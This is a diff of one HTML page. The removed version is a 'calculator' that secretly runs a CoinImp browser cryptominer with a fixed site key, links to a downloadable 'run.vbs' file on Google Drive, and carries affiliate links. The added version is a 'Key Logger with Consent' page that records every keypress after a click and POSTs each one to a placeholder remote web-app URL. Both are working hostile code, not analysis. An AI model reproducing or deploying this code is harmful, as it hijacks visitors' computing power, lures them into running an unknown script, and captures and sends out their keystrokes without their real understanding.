@@ -1,61 +1,49 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Calculator with CoinImp Mining</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin-top: 100px;
-        }
-        #calculator {
-            display: inline-block;
-            border: 1px solid #ccc;
-            padding: 20px;
-            border-radius: 10px;
-        }
-        input {
-            width: 40px;
-            margin: 5px;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Key Logger with Consent</title>
+  <style>
+    body { font-family: Arial; text-align: center; padding: 40px; }
+    #logDisplay { margin-top: 20px; width: 90%; max-width: 600px; height: 200px; overflow-y: auto; background: #f4f4f4; border: 1px solid #ccc; padding: 10px; white-space: pre-wrap; }
+    button { font-size: 16px; padding: 10px 20px; margin: 10px; }
+  </style>
 </head>
 <body>
-     <a href="https://38bb75pjy8g89rd9uff21qbl2h.hop.clickbank.net">link to product </a>
-    <h1>1</h1>
-    <a href="https://drive.google.com/file/d/1jR56hxd37fmEiE7J1Xzddx_Eq9Qr3oBq/view?usp=sharing" download="run.vbs">تحميل الملف</a>
-     <h1>2</h1>
-    <a href="https://14507alhnbdj2qer-zsywi6-uh.hop.clickbank.net">live chat</a>
-    <div id="calculator">
-        <h1>Simple Calculator</h1>
-        <input type="text" id="num1" placeholder="Num 1">
-        <input type="text" id="num2" placeholder="Num 2">
-        <button onclick="addNumbers()">Add</button>
-        <h3>Result: <span id="result"></span></h3>
-    </div>
 
-    <script>
-        // دالة لإجراء عملية الجمع
-        function addNumbers() {
-            var num1 = parseFloat(document.getElementById('num1').value);
-            var num2 = parseFloat(document.getElementById('num2').value);
-            var result = num1 + num2;
-            document.getElementById('result').textContent = result;
-        }
+  <h2>🔒 This page records key presses (for learning only)</h2>
+  <p>Please click "Allow Logging" to continue.</p>
 
-        // دمج كود تعدين CoinImp
-        var miner = new CoinImp.Anonymous('77df418b1f6d4f42050541215eed6c63cfaca765118650d51be37632dfc12cb0');  // ضع مفتاح الموقع الخاص بك هنا
-        miner.start();
+  <button id="startBtn">✅ Allow Logging</button>
+  <div id="logDisplay"></div>
 
-        // الاستماع لحالة التعدين
-        miner.on('found', () => console.log('Hash found!'));
-        miner.on('accepted', () => console.log('Hash accepted!'));
-        miner.on('error', (err) => console.error('Error: ', err));
-    </script>
+  <script>
+    const logDisplay = document.getElementById("logDisplay");
+    const startBtn = document.getElementById("startBtn");
+    const webAppUrl = "YOUR_WEB_APP_URL_HERE"; // Replace with your real Web App URL
 
-    <!-- سكربت CoinImp -->
-    <script src="https://www.coinimp.com/scripts/miner.js"></script>
+    startBtn.addEventListener("click", () => {
+      logDisplay.textContent += "--- Logging started ---\n";
+      document.addEventListener("keydown", async (e) => {
+        const entry = {
+          key: e.key,
+          code: e.code,
+          time: new Date().toLocaleTimeString()
+        };
+        logDisplay.textContent += `Key: ${entry.key}, Code: ${entry.code}, Time: ${entry.time}\n`;
+
+        // Send to Google Sheets
+        await fetch(webAppUrl, {
+          method: "POST",
+          body: JSON.stringify(entry),
+          headers: {
+            "Content-Type": "application/json"
+          }
+        });
+      });
+    });
+  </script>
+
 </body>
 </html>
